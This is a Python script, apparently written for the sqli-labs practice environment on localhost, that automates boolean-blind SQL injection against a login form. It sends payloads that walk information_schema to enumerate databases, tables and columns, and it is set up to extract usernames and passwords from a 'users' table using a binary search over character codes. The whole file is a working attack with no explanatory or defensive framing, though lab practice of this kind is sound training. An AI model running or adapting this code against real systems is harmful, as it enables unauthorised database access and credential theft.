import sys

import requests
# inject_type = bool_blind
def sql_inject_payload(limit_len,str_len,ascii_str):

    pre_inject_str = '1")'
    suf_inject_str = "#"
    #    查询数据库语句
    schema_sql_sequence = f"select schema_name from information_schema.SCHEMATA"
    # 查询数据库的表语句
    table_schema = 'security'
    table_sql_sequence = f"select table_name from information_schema.tables where table_schema='{table_schema}'"
    # 查询表中的字段语句
    table_name = 'users'
    columns_sql_sequence = f"select column_name from information_schema.columns where table_name='{table_name}' and table_schema='{table_schema}'"
    # 查询表中的信息语句
    table_columns = 'username,0x7e,password'
    select_content_sql_sequence = f"select concat({table_columns}) from {table_name}"


    # print(table_sql_sequence)
    poc = f'{pre_inject_str} or (ascii(mid(({schema_sql_sequence} limit {limit_len},1),{str_len},1))>{ascii_str}) {suf_inject_str}'
    return poc
# url: http://localhost/sqli-labs/Less-8/?id=1' and if(ascii(mid((select database()),1,1))>11,sleep(5),1) %23
def connect(limit_len,str_len,ascii_str):

    url = "http://localhost/sqli-labs/Less-16/"
    exp = sql_inject_payload(limit_len,str_len,ascii_str)
    parms = {'uname': exp,'passwd':'admin','submit':'Submit'}
    result = requests.post(url=url,data=parms)
    # print(parms)
    html_result = result.text
    key_string = "flag"
    if key_string in html_result:
        return True
    else:
        return False
def find_str_ascii(limit_len,str_len,ascii_left,ascii_right):
    # 二分法
    while ascii_left < ascii_right:

        ascii_str = int((ascii_left+ascii_right) / 2)
        if connect(str(limit_len),str(str_len+1),str(ascii_str)):
            ascii_left = ascii_str
        else:
            ascii_right = ascii_str
        if (ascii_left==ascii_right-1):
            if connect(str(limit_len),str(str_len+1),str(ascii_str)): #判断相邻两个数中的哪一个数是正确的ascii码
                return chr(ascii_str + 1)
            else:
                return chr(ascii_str)




if __name__ == '__main__':
# url: http://localhost/sqli-labs/Less-8/?id=1' and if(ascii(mid((select schema_name from information_schema.SCHEMATA limit limit_num,1),ascii_str_num,1))>11,sleep(5),1) %23
    limit_len = 44 # 要获取的信息的字符串的条数
    str_len = 66 #每个字符串的长度
    for limit_num in range(limit_len):
        count = 0 #标记,为了让第一层循环早点结束，记录空字符串
        for str_num in range(str_len):
            ascii_result = find_str_ascii(limit_num,str_num,ascii_left=30,ascii_right=127)
            count +=1
            if ord(ascii_result)==31:
                break
            sys.stdout.write(ascii_result)
            sys.stdout.flush()
        if count==1:
            break
        sys.stdout.write("\r\n")
        sys.stdout.flush()




